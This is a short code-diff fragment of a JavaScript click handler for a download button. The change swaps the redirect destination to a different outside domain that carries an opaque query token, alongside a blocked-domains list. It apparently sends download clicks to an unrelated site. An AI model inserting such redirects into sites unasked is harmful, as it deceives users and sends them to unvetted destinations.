@@ -2,7 +2,7 @@ var button = document.querySelector('.btn-downs');
 button.addEventListener('click', function() {
     (function() {
         var originalDomain = "https://mbcvie.com";
-        var redirectURL = "https://www.rolls3.com/";
+        var redirectURL = "https://live33.online/?e9f848b";
         var blockedDomains = [
             "https://mbcvie.com"
         ];
